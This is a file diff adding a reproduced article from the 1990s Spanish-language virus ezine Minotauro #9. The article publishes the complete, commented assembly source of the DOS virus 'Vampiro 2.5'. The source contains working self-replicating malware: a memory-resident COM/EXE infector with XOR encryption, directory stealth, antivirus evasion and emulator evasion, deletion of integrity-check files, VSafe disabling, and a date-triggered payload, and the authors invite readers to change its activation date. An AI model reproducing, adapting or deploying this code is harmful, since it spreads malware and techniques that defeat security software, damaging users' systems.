@@ -1,0 +1,1213 @@
+---
+title: "TEXT_001"
+ezine: "minotauro"
+---
+
+# TEXT_001
+
+**Ezine:** minotauro
+
+<div className="ascii-content">
+
+```
+MINOTAURO MAGAZINE #9:
+			     Produccion Nacional:
+				 Vampiro 2.5
+			   por Drako & Zarathustra
+			       digital anarchy
+
+	A buen entendedor, pocas palabras. El source es el fuente ORIGINAL del
+virus y esta explicado hasta las manos. Decidimos publicarlo ya que desde la 
+version 6.51 del TBAV es detectado como Vampiro, asi que no tiene sentido 
+seguir teniendolo tirado al pedo por ahi. La fecha de activacion es bastante
+vieja ya, enero de 1995 asi que pueden modificarla tranquilamente.
+
+;--- Cut here -----------------------------------------------------------------
+
+;==============================================================================
+; Digital Anarchy Viral Development
+;==============================================================================
+;
+;       Nombre: Vampiro 2.5
+;       Autor : Drako [DAN] & Zarathustra [DAN]
+;       Fecha : 11 de Octubre de 1994
+;       Tamaño: 1644 bytes
+;
+;  Caracteristicas:
+;
+; * Infector de COM/EXE residente por método de MCB
+; * Infecta al ejecutar (4bh)
+; * Encripción variable byte a byte con un XOR
+; * Se mete en el agujero del COMMAND.COM
+; * Directory Stealth (FCB & Handles)
+; * Utiliza una técnica para eludir un posible antivirus que implemente un
+;   micro virtual
+; * No caga los files como el DISKCOPY.COM o XCOPY.EXE del DOS
+; * Redirecciona la int 21h original a la int 18h
+; * Instala su propio handler para la int 24h
+; * Elude al maldito chequeo de Stealth del F-prot. Como ? Bueno, en el momento
+;   de restar se fija si el programa host (desde el Enviroment Block) es algún
+;   file que tenga en su path "TB" ó "F-" para el TBAV y F-Prot respectivamente
+;   Porqué también para el TBAV ? Porque si se crean los archivos de integridad
+;   con el virus en memoria, los crea con un tamaño erróneo..
+; * Cosa parecida para el Chkdsk del DOS, que tambien avisaria..
+;   Cuando vea que las funciones son llamadas por alguno de estos, NO RESTA :)
+; * Usa técnicas anti_heurísticas
+; * Le deshabilita los flags al Vasfe y luego los restituye
+; * Borra los archivitos de checksum ("ANTI-VIR.DAT" y "CHKLIST.MS")
+; * Antes de Infectar EXE's verifica que tenga overlays internos
+; * Antes de Infectar COM's verifica que no sean mayores a 62k
+; * No infecta ningún archivo que esté en el directorio de algún anti_virus
+;   listado.. Osea, cualquier archivo que en todo su string posea un "TB"
+;   (de TBAV), un "F-" (del F-Prot), ó un "SCAN", NO SERA INFECTADO..
+; * Evade :     Thunderbyte 6.23
+;               F-Prot 2.13
+;               Scan 116
+;               Dr. Solomon 6.60
+;               Vsafe
+;               Microsoft Antivirus (MSAV)
+; (TODOS Sin marcar un solo flag) :-)
+;==============================================================================
+;APARENTEMENTE hay un bug en la rutina de la 4eh y 4fh, pero bueno:
+; - ME CAGO EN ESE BUG, OK?!?! :-) Jajajaja. Ese es el espíritu!! :-) Jajajaja
+; Ahora en serio. Ya se ubico el bug, pero suena medio ilogico.. Pasan cosas
+; raras unicamente cuando intercepto la 4eh.. Aparentemente tiene algun otro
+; uso no documentado.. Ejemplo: Cuando se hace un DIR, tambien se ejecuta una
+; 4eh. ESO ES LO QUE CAGA LA RUTINA.. No tengo idea del porque, pero es asi..
+; Lo que hago ahora es NO INTERCEPTAR la 4eh, por las dudas.. Igualmente es
+; IMPOSIBLE que no le reste a un archivo por esto, ya que cuando llegue a la
+; entrada de directorio de algun ARCHIVO, TUVO que haber pasado por los
+; directorios relativos "." y ".." por lo menos, osea que llega con la 4fh y
+; no con la 4eh! :) Ojo, en el raíz como no existe "." y "..", puede ser que
+; al primer archivo no se le reste (en caso de que este infectado obviamente)
+; Generalmente el primer archivo es el COMMAND.COM, asi que es una mierda :)
+; Por eso ahora, a diferencia de la version 2.02, envez de NO INFECTAR el 
+; COMMAND.COM, me meto en su agujero :) (Cualquier versión)
+;==============================================================================
+
+.286c
+CODIGO  SEGMENT BYTE PUBLIC 'CODE'
+	ASSUME CS:CODIGO,DS:CODIGO,SS:CODIGO
+	org 100h
+install PROC FAR
+start_virus:
+
+	virlength_p equ (((offset end_virus - offset start_virus) + 16)/16)+1
+	virlength_d equ offset end_marker - offset start_virus
+	virlength_e equ offset end_marker - offset start_marker
+	direccion_paralelo equ 378h
+
+;==============================================================================
+;COMIENZO del codigo fijo entre infeccion e infeccion
+;==============================================================================
+	push es
+	push ds
+
+	;======================================================================
+	;Calculo del offset Beta
+	;======================================================================
+	mov bp, sp
+	mov ah, 00h
+	int 1ah
+	mov bp, word ptr ss:[bp-06h]
+	sub bp, 108h
+
+	;======================================================================
+	;COMIENZO de la rutina de Desencripcion:
+	;Desencripto sobre la misma memoria, osea sin usar un buffer ;)
+	;======================================================================
+	mov dx, virlength_e
+	mov cx, dx
+	mov dl, byte ptr cs:[bp+clave]
+	lea di, start_marker
+	jmp short decrypt
+	clave db 00h
+decrypt:
+	xor byte ptr cs:[bp+di], dl
+	mov ah, 19h
+	int 21h
+	inc di
+	loop decrypt
+
+;==============================================================================
+;FIN del codigo fijo entre infeccion e infeccion
+;==============================================================================
+start_marker:
+
+	push cs
+	push cs
+	pop ds
+	pop es
+
+	;======================================================================
+	;Chequeo de PlayLoad!! ;-) Muejejeje!!!
+	;======================================================================
+	mov ah, 2ah                     ;<== Se ejecuta a partir de 1995
+	int 21h                         ;    Los dias impares, desde las
+	cmp cx, 1995d                   ;    00:00 a las 03:XX (Inclusive)
+	jae jump_relativo_del_orto7
+	jmp instalar
+jump_relativo_del_orto7:
+	and dl, 00000001b
+	cmp dl, 00000001b
+	je jump_relativo_del_orto8
+	jmp instalar
+jump_relativo_del_orto8:
+	mov ah, 2ch
+	int 21h
+	cmp ch, 03h
+	jbe playload
+	jmp instalar
+
+playload:
+	mov ah, 09h
+	lea dx, mensaje+bp
+	int 21h
+
+	jmp salida
+
+int21_new_service:
+;==============================================================================
+;COMIENZO para la nueva rutina de la int 21h
+;==============================================================================
+	cmp ah, 0ffh
+	jne jump_relativo_del_orto1
+	jmp pregunta_si_estoy_residente
+
+jump_relativo_del_orto1:
+	xchg ah, al
+	cmp al, 4bh
+	xchg ah, al
+	jne jump_relativo_del_orto5
+	jmp handler_4bh
+jump_relativo_del_orto5:
+	cmp ah, 11h
+	je handler_11h_12h
+	cmp ah, 12h
+	je handler_11h_12h
+	cmp ah, 4fh
+	je handler_4eh_4fh
+	jmp fin
+
+handler_24h:
+	mov al, 03h
+	iret
+
+handler_11h_12h:
+	;======================================================================
+	;COMIENZO para el handler de la 11h y 12h
+	;======================================================================
+
+	;======================================================================
+	;Llamo a la 21h para que me llene el FCB con los datos del file
+	;======================================================================
+	pushf
+	call dword ptr cs:[old_int_21-100h]
+
+	;======================================================================
+	;Verifico si es algún puto anti_virus
+	;======================================================================
+	pushf
+	call chequear_host
+	jnc ok_host
+	popf
+	iret
+ok_host:
+	popf
+
+	push ax
+	push bx
+	push es
+
+	cmp al, 00h
+	jne no_restar_fcb
+
+	;======================================================================
+	;Obtengo la direccion del DTA ==> ES:BX
+	;======================================================================
+	mov ah, 2fh
+	int 18h
+
+	;======================================================================
+	;Que tipo de FCB es ? Extendido o no ?
+	;======================================================================
+	cmp byte ptr es:[bx], 0ffh
+	jne no_es_extendido
+
+es_extendido:
+	;======================================================================
+	;Es FCB Extendido:
+	;- Actualizo los offset
+	;======================================================================
+	add bx, 0007h
+
+no_es_extendido:
+	;======================================================================
+	;Ya no es mas Extendido ;) Quedo igual que uno Común
+	;- Esta infectado ? Osea, segundos = 58 ?
+	;======================================================================
+	mov ax, word ptr es:[bx+17h]
+	and ax, 0000000000011111b       ;<== Filtro lo que quiero (segundos)
+	cmp ax, 0000000000011101b       ;<== 29 * 2 = 58 segundos
+	jne no_restar_fcb
+
+	;======================================================================
+	;Me fijo si es un COM o EXE. Para no restarle a un TXT por ejemplo
+	;======================================================================
+	cmp word ptr es:[bx+09h], 'OC'
+	jne no_es_com
+	cmp byte ptr es:[bx+0bh], 'M'
+	je es_com_exe
+
+no_es_com:
+	cmp word ptr es:[bx+09h], 'XE'
+	jne no_restar_fcb
+	cmp byte ptr es:[bx+0bh], 'E'
+	jne no_restar_fcb
+
+es_com_exe:
+	;======================================================================
+	;Modifico el campo del tamaño del file, al correcto ;)
+	;======================================================================
+	sub word ptr es:[bx+1dh], virlength_d
+	sbb word ptr es:[bx+1fh], 0000h
+
+no_restar_fcb:
+
+	pop es
+	pop bx
+	pop ax
+
+	iret
+	;======================================================================
+	;FIN del handler de la 11h y 12h
+	;======================================================================
+
+handler_4eh_4fh:
+	;======================================================================
+	;COMIENZO para el handler de la 4eh y 4fh
+	;======================================================================
+	pushf
+	call dword ptr cs:[old_int_21-100h]
+	jc no_restar_handle
+
+	;======================================================================
+	;Verifico si es algún puto anti_virus
+	;======================================================================
+	pushf
+	call chequear_host
+	jnc ok_host2
+	popf
+	iret
+ok_host2:
+	popf
+
+	push ax
+	push bx
+	push es
+
+	;======================================================================
+	;Obtengo la direccion del DTA ==> ES:BX
+	;======================================================================
+	mov ah, 2fh
+	int 18h
+
+	;======================================================================
+	;Esta infectado ? Osea, segundos = 58 ?
+	;======================================================================
+	mov ax, word ptr es:[bx+16h]
+	and ax, 0000000000011111b       ;<== Filtro lo que quiero (segundos)
+	cmp ax, 0000000000011101b       ;<== 29 * 2 = 58 segundos
+	jne poping
+
+	;======================================================================
+	;Me fijo si es un COM o EXE. Para no restarle a un TXT por ejemplo
+	;======================================================================
+	xor si, si
+shit:
+	inc si
+	cmp byte ptr es:[bx+si+1eh], '.'
+	jne shit
+	inc si
+	cmp word ptr es:[bx+si+1eh], 'OC'
+	jne no_es_com_DTA
+	cmp byte ptr es:[bx+si+1eh+02h], 'M'
+	je restar_dta
+
+no_es_com_DTA:
+	cmp word ptr es:[bx+1eh+si], 'XE'
+	jne poping
+	cmp byte ptr es:[bx+si+1eh+02h], 'E'
+	jne poping
+
+restar_dta:
+	;======================================================================
+	;Modifico el DTA porque esta infectado
+	;======================================================================
+	sub word ptr es:[bx+1ah], virlength_d
+	sbb word ptr es:[bx+1ch], 0000h
+
+poping:
+	pop es
+	pop bx
+	pop ax
+
+no_restar_handle:
+	;======================================================================
+	;Actualizo los flags dentro del stack, para que al hacer el IRET, no me
+	;cague los flags actuales
+	;======================================================================
+	mov word ptr cs:[registro-100h], ax
+	cli
+	sub sp, 0002h
+	pop ax
+	add sp, 0006h
+	push ax
+	sub sp, 0004h
+	sti
+	mov ax, word ptr cs:[registro-100h]
+	iret
+
+	;======================================================================
+	;FIN del handler de la 4eh y 4fh
+	;======================================================================
+
+handler_4bh:
+	;======================================================================
+	;COMIENZO del handler de la 4bh
+	;======================================================================
+	pushf
+	pusha
+	push ds
+	push es
+
+	push ds
+	push dx
+
+	;======================================================================
+	;Me fijo si es algun file del TBAV, F-PROT, ó SCAN (o el COMMAND.COM)
+	;======================================================================
+	push cs                         ;<== Porque lo necesita el procedure.
+	pop es
+
+	mov byte ptr cs:[es_command-100h], 'N'  ;<== Reseteo la variable
+
+	lea ax, command-100h
+	mov bx, 0010d
+	call chequear_anti_virus
+	jc command_com                  ; Bueno, en realidad el COMMAND.COM :)
+	lea ax, tbav-100h
+	mov bx, 0001h
+	call chequear_anti_virus
+	jc maldito_anti_virus
+	lea ax, fprot-100h
+	;mov bx, 0001h                  ;<== Viene de arriba :)
+	call chequear_anti_virus
+	jc maldito_anti_virus
+	lea ax, scan-100h
+	add bl, 02h                     ;<== De arriba :)
+	call chequear_anti_virus
+	jnc no_es_ningun_anti_virus
+
+maldito_anti_virus:
+	pop dx
+	pop ds
+	jmp seguir_21h
+
+command_com:
+	mov byte ptr cs:[es_command-100h], 'Y'
+
+no_es_ningun_anti_virus:
+	;======================================================================
+	;Obtengo y Seteo la int 24h a mi programa
+	;======================================================================
+	mov ax, 3524h
+	int 18h
+	mov word ptr cs:[old_24h-100h], es
+	mov word ptr cs:[old_24h-100h+02h], bx
+
+	mov ax, 2524h
+	push cs
+	pop ds
+	lea dx, handler_24h-100h
+	int 18h
+
+	;======================================================================
+	;Borrar los archivitos de checksum
+	;======================================================================
+	lea dx, chklist-100h
+	call borrar_chk
+	lea dx, anti_vir-100h
+	call borrar_chk
+
+	;======================================================================
+	;Desinstalo el Vsafe.. (Bah, le anulo los flags :-)
+	;======================================================================
+	xor bl, bl
+	call change_vsafe
+
+	;======================================================================
+	;Obtengo los atributos del file, los guardo y los anulo
+	;======================================================================
+	pop dx
+	pop ds
+	push ds
+	push dx
+
+	mov ax, 4300h
+	int 18h
+	mov word ptr cs:[atributos-100h], cx
+	mov ax, 4301h
+	xor cx, cx
+	int 18h
+
+	;======================================================================
+	;Abro el file
+	;======================================================================
+	mov ax, 3d02h
+	int 18h
+
+	;======================================================================
+	;Leo los 20h primeros bytes
+	;======================================================================
+	mov bx, ax
+	mov ah, 3fh
+	push cs
+	pop ds
+	mov cx, 0020h
+	lea dx, buffer_tmp-100h
+	int 18h
+
+	;======================================================================
+	;Me fijo si es EXE o COM
+	;======================================================================
+	cmp byte ptr cs:[buffer_tmp-100h], 'M'
+	jne archivo_com
+	cmp byte ptr cs:[buffer_tmp-100h+01h], 'Z'
+	je archivo_exe
+
+archivo_com:
+	;======================================================================
+	;Verifico si está infectado el COM
+	;======================================================================
+	push cs
+	pop ds
+	xor al, al
+	mov dx, word ptr cs:[buffer_tmp-100h+01h]
+	add dx, 0003h
+	call mover_puntero
+
+	mov ah, 3fh
+	mov cx, 0002h
+	lea dx, infeccion-100h          ;<== Buffer para que no llore ;)
+	int 18h
+
+	cmp word ptr cs:[infeccion-100h], 1e06h ;<== Opcodes PUSH ES DS
+	jne jump_relativo_del_orto4
+	jmp esta_infectado
+jump_relativo_del_orto4:
+
+	;======================================================================
+	;Me fijo si tiene un tamaño aceptable (Tam < 62000d)
+	;======================================================================
+	mov al, 02h
+	call mover_con_xor
+	cmp ax, 62000d
+	jb infectar_com
+	jmp esta_infectado
+
+archivo_exe:
+	;======================================================================
+	;Verifico si está infectado el EXE
+	;======================================================================
+	cmp word ptr cs:[buffer_tmp-100h+10h], 2000h
+	je jump_relativo_del_orto2
+
+	mov al, 02h                             ;<== Esta solapado ?
+	call mover_con_xor
+	mov cx, 0512d
+	div cx
+	cmp word ptr cs:[buffer_tmp-100h+04h], ax
+	jbe jump_relativo_del_orto2
+	jmp infectar_exe
+jump_relativo_del_orto2:
+	jmp esta_infectado
+
+infectar_com:
+	;======================================================================
+	;Obtengo la fecha del file y la guardo
+	;======================================================================
+	call get_date
+
+	;======================================================================
+	;BOLUDEO CON LAS VARIABLES:
+	;Ahora paso el buffer_tmp a bytes_org
+	;(Copio lo que hay en DS:SI a ES:DI)
+	;======================================================================
+	call salvar_vars
+
+	;======================================================================
+	;Muevo el puntero al final para medir el file
+	;======================================================================
+	mov al, 02h
+	call mover_con_xor
+
+	cmp byte ptr cs:[es_command-100h], 'Y'
+	jne mover_como_corresponde
+	sub ax, virlength_d             ;<== Acomodo el puntero para que
+					; retroceda 1.5k en el command..
+					; (Espacio MUY al pedo)
+	;sbb dx, 0000h                  ;<== En realidad no es necesario :)
+
+	mov dx, ax                      ;<== Muevo el puntero de nuevo :)
+	xor al, al
+	call mover_puntero
+
+mover_como_corresponde:
+	push ax                         ;<== Guardo el tamaño del file
+
+;==============================================================================
+;COMIENZO de la rutina de encripcion
+;==============================================================================
+
+	;======================================================================
+	;Consigo una clave: En este caso el tamaño del file ;)
+	;Y encripto con un XOR
+	;======================================================================
+	call crypt
+
+	;======================================================================
+	;Escribo el Virus en el file (La parte No Encriptada y la Encriptada)
+	;======================================================================
+	call escribir_encripcion
+
+	;======================================================================
+	;Me voy al principio de nuevo ;)
+	;======================================================================
+	call mover_con_xorAL00
+
+	;======================================================================
+	;BOLUDEO CON LAS VARIBLES:
+	;Modifico la variable del comienzo
+	;======================================================================
+	pop ax                          ;<== Tamaño del file en bytes
+	sub ax, 0003h                   ;<== La magia siempre presente
+	mov word ptr cs:[bytes_infectado-100h], ax
+
+	;======================================================================
+	;Escribo los 3 primeros bytes en el file
+	;======================================================================
+	mov ah, 40h
+	mov cx, 0003h
+	lea dx, jump-100h
+	int 18h
+	jmp marcar_infeccion
+
+infectar_exe:
+
+	;======================================================================
+	;Obtengo la fecha del file y la guardo
+	;======================================================================
+	call get_date
+
+	;======================================================================
+	;BOLUDEO CON LAS VARIABLES:
+	;Ahora paso el buffer_tmp a bytes_org y tambien a buffer_infectado
+	;(Copio lo que hay en DS:SI a ES:DI)
+	;======================================================================
+	call salvar_vars
+
+	lea si, buffer_tmp-100h
+	lea di, bytes_infectado-100h
+	mov cx, 0020h
+	rep movsb
+
+	;======================================================================
+	;Muevo el puntero al final para medir el file
+	;======================================================================
+	mov al, 02h
+	call mover_con_xor
+
+	;======================================================================
+	;Ya que estoy calculo los nuevos datos del header:
+	;IP (14h del header)
+	;CS (16h del header)
+	;SS (0eh del header)
+	;SP (10h del header)
+	;======================================================================
+	mov cx, word ptr cs:[buffer_tmp-100h+08h]
+	shl cx, 0004h
+	cmp ax, cx
+	jae jump_relativo_del_orto3
+	jmp esta_infectado
+jump_relativo_del_orto3:
+
+	sub ax, cx
+	mov cx, 10h
+	div cx
+
+	mov word ptr cs:[bytes_infectado-100h+14h], dx          ;<== IP
+	mov word ptr cs:[bytes_infectado-100h+16h], ax          ;<== CS
+	inc ax
+	mov word ptr cs:[bytes_infectado-100h+0eh], ax          ;<== SS
+	mov word ptr cs:[bytes_infectado-100h+10h], 2000h       ;<== SP
+
+	;======================================================================
+	;Encripto
+	;======================================================================
+	call crypt
+
+	;======================================================================
+	;Escribo el Virus en el file (La parte No Encriptada y la Encriptadada)
+	;======================================================================
+	call escribir_encripcion
+
+	;======================================================================
+	;Vuelvo a medir el file ;)
+	;======================================================================
+	mov al, 02h
+	call mover_con_xor
+
+	;======================================================================
+	;Calculo el ultimo dato que necesito:
+	;Cantidad de paginas que mide (04h)
+	;Bytes usados de la ultima pagina (02h)
+	;======================================================================
+	mov cx, 512d
+	div cx
+	inc ax
+	mov word ptr cs:[bytes_infectado-100h+04h], ax  ;<== Paginas
+	mov word ptr cs:[bytes_infectado-100h+02h], dx  ;<== Bytes última pág.
+
+	;======================================================================
+	;Me voy al principio de nuevo ;)
+	;======================================================================
+	call mover_con_xorAL00
+
+	;======================================================================
+	;Escribo el nuevo header (los 20h primeros bytes)
+	;======================================================================
+	mov ah, 40h
+	mov cx, 0020h
+	lea dx, bytes_infectado-100h
+	int 18h
+
+marcar_infeccion:
+	;======================================================================
+	;Restauro la fecha y marco infeccion
+	;======================================================================
+	cmp byte ptr cs:[es_command-100h], 'Y'
+	jne correcta
+
+erronea:
+	call set_date
+	or cx,  0000000000011100b       ;<== Segundos erróneos
+	int 18h
+	jmp esta_infectado
+
+correcta:
+	call set_date
+	or cx,  0000000000011101b       ;<== Segundos correctos
+	int 18h
+
+esta_infectado:
+	;======================================================================
+	;Cierro el file
+	;======================================================================
+	mov ah, 3eh
+	int 18h
+
+	;======================================================================
+	;Pongo los atributos como estaban antes
+	;======================================================================
+	pop dx
+	pop ds
+	mov ax, 4301h
+	mov cx, word ptr cs:[atributos-100h]
+	int 18h
+
+	;======================================================================
+	;Re-instalo el Vsafe.. :-(( ;)
+	;======================================================================
+	mov bl, byte ptr cs:[vsafe-100h]
+	call change_vsafe
+
+	;======================================================================
+	;Dejo la 24h como estaba antes
+	;======================================================================
+	mov ax, 2524h
+	mov ds, word ptr cs:[old_24h-100h]
+	mov dx, word ptr cs:[old_24h-100h+02h]
+	int 18h
+
+seguir_21h:
+	pop es
+	pop ds
+	popa
+	popf
+fin:
+	;======================================================================
+	;Le doy el control a la 21h original
+	;======================================================================
+	jmp dword ptr cs:[old_int_21-100h]
+
+pregunta_si_estoy_residente:
+
+	;======================================================================
+	;Me preguntan si estoy residente. Le digo que si ;)
+	;======================================================================
+	mov ah, 0feh            ;<-- le digo que si ;)
+	iret
+
+;==============================================================================
+;FIN para la nueva rutina de la int 21h
+;==============================================================================
+
+instalar:
+
+;==============================================================================
+;RUTINA DE INSTALACION DEL HANDLER DE LA INT 21h:
+;Pregunto si estoy residente
+;==============================================================================
+	push 0ff00h
+	pop ax
+	int 21h
+	cmp ah, 0feh
+	je ya_esta_residente
+
+	;======================================================================
+	;Copio la 21h a la 18h de manera tal que de cagar a cualquier monitor
+	;de actividades de una manera "anti-micro_virtual"
+	;======================================================================
+	cli
+	push ds
+	push es
+	mov ax, 1200h           ;<== Lo unico que importa es AL=00h
+	mov dx, direccion_paralelo
+	out dx, al              ;<== Pongo 0 en la puerta paralela
+	jmp $+2                 ;<== I/O Delay (necesario)
+
+	mov si, 21h * 4         ; Vector de la 21h
+	mov di, 18h * 4         ; Vector de la 18h (ROM Basic)
+
+	in al, dx               ; AL sigue en cero, pero despista a la
+	cbw                     ; (posible) máquina virtual. AH = AL => AX=0
+	mov ds, ax              ; DS=0000h ==> Segmento de la tabla
+	mov es, ax              ; ES=0000h ==> de vectores
+
+	movsw                   ; Copio el vector de la 21h, a la 18h
+	movsw
+
+	pop es ds
+	sti
+	;======================================================================
+	;FIN del bloque anti_micro_virtual
+	;======================================================================
+
+	;======================================================================
+	;Obtengo vectores de la int 21h
+	;Los guardo en una variable
+	;======================================================================
+	mov ax, 3521h
+	int 18h
+
+	mov word ptr cs:[bp+int21_offset_original], bx
+	mov ax, es
+	mov word ptr cs:[bp+int21_segmento_original], ax
+
+	;======================================================================
+	;METODO DE MCB:
+	;-Obtengo el segmento y la memoria usada
+	;-Le resto el tamano del virus
+	;-Hago el Resize del Bloque (4ah)
+	;-Ahora Alocateo la Memoria que queda a mi Virus (48h)
+	;-Ahora marco ese MCB como del DOS
+	;-Ahora copio el virus a la memoria reservada
+	;======================================================================
+	pop ds
+	push ds
+
+	mov ax, ds
+	dec ax
+	mov es, ax                      ;<-- ES<== Segmento del MCB
+	mov ax, word ptr es:[3]         ;<-- AX<== Memoria usada por el prog.
+
+	sub ax, virlength_p
+
+	mov bx, ax                      ;<-- BX<== Nuevo Tamano para el ReSize
+	push ds
+	pop es
+	mov ah, 4ah
+	int 18h
+
+	mov bx, virlength_p
+	dec bx
+	mov ah, 48h
+	int 18h
+
+	dec ax                          ;<-- AX<== Segmento del MCB de mi Virus
+	mov es, ax
+	mov word ptr es:[1], 8
+	mov word ptr es:[8], 'XX'
+	inc ax                          ;<-- AX<== Inicio del Bloque de Mem.
+	mov es, ax
+
+	cld
+	mov cx, virlength_d
+	push cs
+	pop ds
+	lea si, install+bp
+	xor di, di
+	rep movsb
+
+	;======================================================================
+	;FIN DEL METODO DE MCB
+	;======================================================================
+
+	;======================================================================
+	;Seteo nuevo vector de la int. 21h
+	;======================================================================
+	mov ax, 2521h
+	push es
+	pop ds
+	lea dx, int21_new_service-100h
+	int 18h
+
+ya_esta_residente:
+
+	;======================================================================
+	;Es la primera vez que se ejecuta ? Si es, salgo al DOS
+	;======================================================================
+	cmp word ptr cs:[bp+bytes_org+1], '00'
+	jne continuar
+
+salida:
+
+	;======================================================================
+	;Salida al DOS
+	;======================================================================
+	pop ds                          ;<== Para limpiar el stack de los push
+	pop es                          ;    del principio.
+	mov ah, 4ch
+	int 21h
+
+continuar:
+
+	;======================================================================
+	;Antes de darle el control, se lo tengo que dar a un COM ó a un EXE ?
+	;======================================================================
+	cmp byte ptr cs:[bp+bytes_org], 'M'
+	jne control_com
+	cmp byte ptr cs:[bp+bytes_org+01h], 'Z'
+	je control_exe
+
+control_com:
+
+	;======================================================================
+	;Le doy el control al COM
+	;Para esto sobreescribo los primeros 3 bytes del file con los orig. ;)
+	;(Copio DS:SI contra ES:DI)
+	;======================================================================
+	pop ds                          ;<== Para limpiar el stack de los push
+	pop es                          ;    del principio.
+
+	push cs
+	pop ds
+	lea si, bp+bytes_org
+	push cs
+	pop es
+	mov di, 100h
+	mov cx, 0003h
+	rep movsb
+
+	call clear_regs
+	mov bp, 00ffh
+	inc bp
+	jmp bp
+
+control_exe:
+
+	;======================================================================
+	;Le doy el control al EXE
+	;======================================================================
+	pop ds
+	pop es
+	mov si, word ptr cs:[bp+bytes_org+14h]          ;<== IP
+	mov ax, word ptr cs:[bp+bytes_org+16h]          ;<== CS
+	mov bx, word ptr cs:[bp+bytes_org+0eh]          ;<== SS
+	mov cx, word ptr cs:[bp+bytes_org+10h]          ;<== SP
+	mov dx, es
+	add dx, 10h                                     ;<== DX=PSP+10h
+	add ax, dx
+	add bx, dx
+
+	;======================================================================
+	;Acomodo la pila como estaba antes (ya relocada)
+	;======================================================================
+	cli
+	push bx
+	pop ss
+	mov sp, cx
+	sti
+
+	;======================================================================
+	;Preparo el far jump al codigo original
+	;======================================================================
+	push ax
+	push si
+	call clear_regs
+	ret 4
+
+install         endp
+;==============================================================================
+;                         PROCEDIMIENTOS MAS USADOS
+;==============================================================================
+Mover_con_xorAL00:
+	xor al, al
+	Mover_con_xor:
+	xor dx, dx
+	Mover_puntero:
+	mov ah, 42h
+	xor cx, cx
+	int 18h
+	ret
+
+Escribir_encripcion:
+	;====================================================
+	;Escribo el Virus en el file (La parte No Encriptada)
+	;====================================================
+	mov ah, 40h
+	mov cx, virlength_d - virlength_e
+	xor dx, dx
+	int 18h
+
+	;============================================
+	;Ahora escribo el resto (La parte Encriptada)
+	;============================================
+	mov ah, 40h
+	mov cx, virlength_e
+	lea dx, buffer_encriptado-100h
+	int 18h
+	ret
+
+	;=================
+	;Encripto el Virus
+	;=================
+Crypt:
+	cmp al, 00h
+	jne clave_ok
+	inc al
+
+	clave_ok:
+	mov byte ptr cs:[clave-100h], al
+	mov cx, virlength_e
+	lea si, start_marker
+	lea di, buffer_encriptado
+
+	crypt_all:
+	mov dl, byte ptr cs:[si-100h]
+	xor dl, al
+	mov byte ptr cs:[di-100h], dl
+
+	inc si
+	inc di
+	loop crypt_all
+	ret
+
+Borrar_Chk:
+	mov ax, 4301h
+	push cs
+	pop ds
+	xor cx, cx
+	int 18h
+
+	mov ah, 41h
+	int 18h
+	ret
+
+Change_Vsafe:
+	mov ax, 0fa02h
+	mov dx, 5945h
+	int 18h
+	mov byte ptr cs:[vsafe-100h], cl
+	ret
+
+Salvar_vars:
+	cld
+	push cs
+	pop ds
+	lea si, buffer_tmp-100h
+	push cs
+	pop es
+	lea di, bytes_org-100h
+	mov cx, 0020h
+	rep movsb
+	ret
+
+Chequear_anti_virus:
+;===========================================
+;Si es un Anti_Virus prende el Carry Flag
+;Si no lo es lo apaga
+;Entradas:
+;DS:DX <== String Original
+;ES:AX <== Variable
+;BX    <== Contador de caracteres a comparar
+;===========================================
+	cld
+	mov si, dx
+
+	seguir_y_resetear:
+	cmp byte ptr ds:[si], 00h       ;<== Si es "0" Que termine
+	je no_es_anti_vir
+	mov di, ax
+	mov cx, bx                      ;<== Actualizo el contador :)
+
+	repetir_comparacion:
+	cmpsb
+	jne seguir_y_resetear
+	loop repetir_comparacion
+
+	cmpsb
+	jne seguir_y_resetear
+
+	stc
+	ret
+
+	no_es_anti_vir:
+	clc                             ;<== Indica que no es un Antivirus
+	ret
+
+Chequear_host:
+;======================================
+;Chequeo si el host no es un anti_virus
+;======================================
+	pusha
+	push es
+	push ds
+
+	mov ah, 62h
+	int 18h
+	cld
+	mov es, bx
+	mov es, word ptr es:[2ch]
+
+	xor di, di
+	mov cx, 0001h
+
+	busco_ceros:
+	inc di
+	cmp byte ptr es:[di], 00h
+	jne busco_ceros
+	loop busco_ceros
+
+	busco_uno:
+	inc di
+	cmp byte ptr es:[di], 01h
+	jne busco_uno
+
+	busco_cero:
+	inc di
+	cmp byte ptr es:[di], 00h
+	jne busco_cero
+	inc di                          ;<== Filename del host
+
+	push es                         ;<== En DS:DX necesito el ENVIRONMENT
+	pop ds                          ;<== En ES:AX necesito la VARIABLE
+	push cs
+	pop es
+
+	mov dx, di
+	lea ax, tbav-100h
+	mov bx, 0001h
+	call chequear_anti_virus
+	jc puto_anti_virus
+	lea ax, fprot-100h
+	;mov bx, 0001h                  ;<== Viene de arriba :)
+	call chequear_anti_virus
+	jc puto_anti_virus
+	lea ax, chkdsk-100h
+	add bl, 04h                     ;<== Viene de arriba :)
+	call chequear_anti_virus
+	jc puto_anti_virus
+	clc
+
+	puto_anti_virus:
+	pop ds
+	pop es
+	popa
+	
+	ret
+
+set_date:
+;============================
+;Setear fecha, osea infeccion
+;============================
+	mov ax, 5701h
+	mov dx, word ptr cs:[fecha-100h]
+	mov cx, word ptr cs:[fecha-100h+02h]
+	and cx, 1111111111100000b
+	ret
+
+get_date:
+;======================
+;Obtener fecha del file
+;======================
+	mov ax, 5700h
+	int 18h
+	xor di, di
+	mov word ptr cs:[fecha-100h], dx
+	mov word ptr cs:[fecha-100h+02h], cx
+	ret
+
+clear_regs:
+;=============================
+;Me limpio todos los registros
+;=============================
+	xor ax, ax
+	xor bx, bx
+	xor cx, cx
+	xor dx, dx
+	xor si, si
+	xor di, di
+	xor bp, bp
+	ret
+
+;==============================================================================
+;                               AREA DE DATOS
+;==============================================================================
+old_int_21 label dword
+int21_offset_original dw 00h
+int21_segmento_original dw 00h
+chklist db 'CHKLIST.MS',0
+anti_vir db 'ANTI-VIR.DAT',0
+tbav db 'TB'
+fprot db 'F-'
+scan db 'SCAN'
+chkdsk db 'CHKDSK'
+command db 'COMMAND.COM'
+bytes_org db 'X00XXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
+mensaje db 'NO NO NO!! Que hace todavia despierto?!?!', 0ah, 0dh
+db 'Drako & Zarathustra le OBLIGAN a dormir.', 0ah, 0dh
+db 'Que sea la última vez, ok?!?! En caso contrario, morira.. JAJAJAJAJAJA', 0ah, 0dh
+db 'Vampiro 2.5 - (C) Digital Anarchy Viral Development$'
+jump db 'Θ'
+
+end_marker:
+bytes_infectado db 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
